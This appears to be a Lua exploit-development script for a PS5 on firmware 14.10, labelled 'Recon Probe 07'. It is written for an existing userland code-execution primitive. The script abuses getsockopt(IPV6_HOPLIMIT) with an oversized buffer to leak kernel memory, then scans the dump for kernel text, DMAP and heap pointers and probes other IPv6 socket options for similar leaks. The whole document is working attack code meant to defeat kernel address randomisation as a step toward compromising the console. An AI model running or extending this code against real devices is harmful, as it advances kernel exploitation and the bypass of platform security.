-- 14.10 Recon Probe 07: IPv6 HOPLIMIT getsockopt info leak dump
-- getsockopt(IPV6_HOPLIMIT) returned 8192 bytes in probe 06
-- Dump the raw bytes and scan for kernel pointers

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: IPV6_HOPLIMIT LEAK DUMP ===")
log("fw: " .. tostring(FW_VERSION))

syscall.resolve({
    sc_socket = 97, sc_close = 6,
    sc_setsockopt = 105, sc_getsockopt = 118,
})

-- Create IPv6 UDP socket
local fd = syscall.sc_socket(28, 2, 0):tonumber()
log("socket fd: " .. fd)
if fd < 0 then
    log("FAILED to create socket")
    return table.concat(out, "\n")
end

-- First enable IPV6_RECVHOPLIMIT so the option has data
local optbuf = memory.alloc(4)
memory.write_dword(optbuf, 1)
pcall(function()
    syscall.sc_setsockopt(fd, 41, 37, optbuf, 4) -- IPV6_RECVHOPLIMIT=37
end)

-- Also set HOPLIMIT itself
memory.write_dword(optbuf, 64)
pcall(function()
    syscall.sc_setsockopt(fd, 41, 47, optbuf, 4) -- IPV6_HOPLIMIT=47
end)

-- Now do the leak: getsockopt with large buffer
local LEAK_SIZE = 8192
local leak_buf = memory.alloc(LEAK_SIZE + 16)
local optlen = memory.alloc(8)

-- Zero the buffer first so we can see what kernel writes
for i = 0, LEAK_SIZE - 1, 8 do
    memory.write_qword(leak_buf + i, 0)
end

memory.write_dword(optlen, LEAK_SIZE)
local ok, err = pcall(function()
    return syscall.sc_getsockopt(fd, 41, 47, leak_buf, optlen)
end)

local actual_len = memory.read_dword(optlen):tonumber()
log("getsockopt ret: " .. (ok and "OK" or tostring(err):sub(1,40)))
log("returned length: " .. actual_len)

if actual_len <= 0 then
    syscall.sc_close(fd)
    log("no data returned")
    return table.concat(out, "\n")
end

-- Dump first 4 bytes (the actual hoplimit value)
local val = memory.read_dword(leak_buf):tonumber()
log("hoplimit value: " .. val)

-- Scan for potential kernel pointers
-- PS5 kernel pointers typically: 0xFFFFxxxx_xxxxxxxx (high kernel)
-- or DMAP region: 0xFFFFF8xx_xxxxxxxx
-- or kernel text: 0xFFFFFFFF_8xxxxxxx
log("")
log("--- scanning for kernel pointers ---")
local ptr_count = 0
local unique_ptrs = {}

for i = 0, actual_len - 8, 8 do
    local lo = memory.read_dword(leak_buf + i):tonumber()
    local hi = memory.read_dword(leak_buf + i + 4):tonumber()

    if hi ~= 0 then
        local is_kernel = false
        local tag = ""

        -- Kernel text: 0xFFFFFFFF8xxxxxxx
        if hi >= 0xFFFFFFFF and lo >= 0x80000000 then
            is_kernel = true
            tag = "KTEXT"
        -- DMAP: 0xFFFFF8xxxxxxxxxx
        elseif hi >= 0xFFFFF800 and hi < 0xFFFFFF00 then
            is_kernel = true
            tag = "DMAP"
        -- High kernel: 0xFFFFxxxxxxxxxxxx
        elseif hi >= 0xFFFF0000 then
            is_kernel = true
            tag = "KHIGH"
        -- Userland high: 0x00000008xxxxxxxx (loaded modules)
        elseif hi >= 0x00000008 and hi < 0x00000009 then
            tag = "UMOD"
        -- Heap: 0x00000002xxxxxxxx
        elseif hi >= 0x00000002 and hi < 0x00000004 then
            tag = "HEAP"
        end

        if is_kernel or tag ~= "" then
            local ptr_str = string.format("%08x%08x", hi, lo)
            if not unique_ptrs[ptr_str] then
                unique_ptrs[ptr_str] = true
                ptr_count = ptr_count + 1
                log(string.format("  +%04x: 0x%s [%s]", i, ptr_str, tag))
            end
        end
    end
end

log("")
log("total pointer-like values: " .. ptr_count)

-- Hex dump first 256 bytes
log("")
log("--- hex dump (first 256 bytes) ---")
local cap = math.min(actual_len, 256)
for row = 0, cap - 1, 16 do
    local hex_parts = {}
    local ascii_parts = {}
    for col = 0, 15 do
        if row + col < cap then
            local b = memory.read_byte(leak_buf + row + col):tonumber()
            hex_parts[#hex_parts+1] = string.format("%02x", b)
            if b >= 32 and b < 127 then
                ascii_parts[#ascii_parts+1] = string.char(b)
            else
                ascii_parts[#ascii_parts+1] = "."
            end
        end
    end
    log(string.format("  %04x: %s  %s", row, table.concat(hex_parts, " "), table.concat(ascii_parts)))
end

-- Hex dump bytes 4-16 at qword granularity for pointer analysis
log("")
log("--- qword dump (all " .. actual_len .. " bytes) ---")
local qw_cap = math.min(actual_len, LEAK_SIZE)
for i = 0, qw_cap - 1, 32 do
    local parts = {}
    for j = 0, 24, 8 do
        if i + j + 7 < qw_cap then
            local lo2 = memory.read_dword(leak_buf + i + j):tonumber()
            local hi2 = memory.read_dword(leak_buf + i + j + 4):tonumber()
            parts[#parts+1] = string.format("%08x%08x", hi2, lo2)
        end
    end
    log(string.format("  %04x: %s", i, table.concat(parts, " ")))
end

-- Try other IPv6 options for comparison
log("")
log("--- other IPv6 option sizes ---")
local test_opts = {
    {46, "PKTINFO"}, {47, "HOPLIMIT"}, {48, "NEXTHOP"},
    {49, "HOPOPTS"}, {50, "DSTOPTS"}, {51, "RTHDR"},
    {52, "PKTOPTIONS"}, {61, "AUTOFLOWLABEL"},
}
for _, o in ipairs(test_opts) do
    memory.write_dword(optlen, LEAK_SIZE)
    local ok2 = pcall(function()
        return syscall.sc_getsockopt(fd, 41, o[1], leak_buf, optlen)
    end)
    if ok2 then
        local sz = memory.read_dword(optlen):tonumber()
        log("  " .. o[2] .. " (" .. o[1] .. "): " .. sz .. " bytes")
    else
        log("  " .. o[2] .. " (" .. o[1] .. "): failed")
    end
end

syscall.sc_close(fd)

log("")
log("=== IPV6 LEAK DUMP DONE ===")
return table.concat(out, "\n")
